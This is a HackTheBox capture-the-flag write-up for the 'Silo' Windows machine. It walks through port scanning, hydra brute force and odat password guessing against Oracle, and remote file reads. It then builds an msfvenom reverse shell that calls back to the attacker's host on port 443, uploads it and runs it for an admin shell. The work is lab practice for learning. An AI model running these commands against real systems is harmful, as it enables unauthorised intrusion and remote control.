---

title: "Silo"
date: 2023-08-10T11:30:03+00:00
tags: ["web","windows","oracle","odat"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Silo.png"
comments: false
description: "This is a friendly windows machine that is vulnerable because the oracle ports are deprecated."

---

## Room Information

- Room name: Silo
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/silo

![Untitled](/HTB/Silo.png)

## Tools Used

- Nmap
- searchsploit
- msfvenom
- odat
- crackmapexec
- smbclient

## Port Scanning

Other room, other port scan.

```bash
sudo nmap -p- --min-rate 5000 -sS 10.10.10.82 -oG allports
extractPorts allports
sudo nmap -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 --min-rate 5000 -sCV -sS 10.10.10.82 -oN targeted
```

![Untitled](/HTB/escaneo-silo.png)

Seeing this we can know that there are a lot of open ports: 80(**http**), 135(msrpc), 139(**smb**), 445(**smb**), 1521(**oracle**), 5985(**http**), 47001(**http**), 49152(msrpc) ,49153,49154,49155,49159(**oracle**)…

In this case I focused on port 80, **smb** and **oracle** services.

## Enumeration

As I always do with all machines I set out to do the directory scan with **gobuster** and **wfuzz,** but I didn’t find anything.

![Untitled](/HTB/web-silo.png)

After a while of trying things on the web, I decided to leave it aside and continue with the search for information about **smb** and **oracle** ports.

## Exploiting

At first I tried to **brute force** with **hydra** to find out the **oracle** passwords, but it didn’t work. I leave here the command:

```bash
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```

```bash
┌──(kali㉿kali)-[~/HTB/silo]
└─$ hydra -P ~/Downloads/users-oracle.txt -t 32 -s 1521 10.10.10.82 oracle-listener 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-04 05:03:42
[DATA] max 32 tasks per 1 server, overall 32 tasks, 1369 login tries (l:1/p:1369), ~43 tries per task
[DATA] attacking oracle-listener://10.10.10.82:1521/
[STATUS] 571.00 tries/min, 571 tries in 00:01h, 798 to do in 00:02h, 32 active
[STATUS] 559.00 tries/min, 1118 tries in 00:02h, 251 to do in 00:01h, 32 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-04 05:06:13
```

After that I decided to use the **odat** program to try to vulnerate the **oracle** services. I started **cracking** the **SID** of oracle using this command:

```bash
python3 odat.py sidguesser -s 10.10.10.82
```

![Untitled](/HTB/odat1-silo.png)

pd:  I discovered that it was XE.

Then I start **guessing** the **user** and **password** using this command:

```bash
python3 odat.py passwordguesser -d XE -s 10.10.10.82
```

![Untitled](/HTB/odat2-silo.png)

I also test if the user and pass works for **smb** service too, but didn’t works…

```bash
crackmapexec smb 10.10.10.82 -U 'scott' -P 'tiger'
```

```bash
┌──(kali㉿kali)-[~/HTB/silo]
└─$ crackmapexec smb 10.10.10.82
SMB         10.10.10.82     445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
```

![Untitled](/HTB/crack-silo.png)

pd: I found that user→**scott**, and pass→**tiger**

Then I start testing if I can read files remotely, and I saw that it was posible…

```bash
python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --getFile /windows/system32/drivers/etc/ hosts hosts --sysdba
```

![Untitled](/HTB/odat3-silo.png)

So I uploaded a reverse_shell that I created with **msfvenom** by applying this commands:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe > reverse.exe
python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --putFile /Users/Public/Documents reverse.exe ~/HTB/Silo/reverse.exe --sysdba
```

![Untitled](/HTB/msf-silo.png)

![Untitled](/HTB/odat4-silo.png)

Then I putted my machine listening on port 443, and execute the reverse.exe with this command:

```bash
python3 odat.py externaltable -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --exec /Users/Public/Documents/ reverse.exe --sysdba
```

![Untitled](/HTB/pwn-silo.png)

So at this point I was in 😇

## Treatment of tty

```bash
 script /dev/null -c bash
 ctrl + z
 stty raw -echo; fg
 restet xterm
 export TERM=xterm

```

## Escalating Privileges

A didn’t need to escalate privileges because I entered as admin.

![Untitled](/HTB/root-silo.png)

## Lessons Learned

- What insights did you gain from the room?
    
    I learn more about the **oracle**, and **smb**.
    
- Where there any novel tools or techniques employed?
    
    Using **odat** and **crackmapexec**, and hydra for oracle…
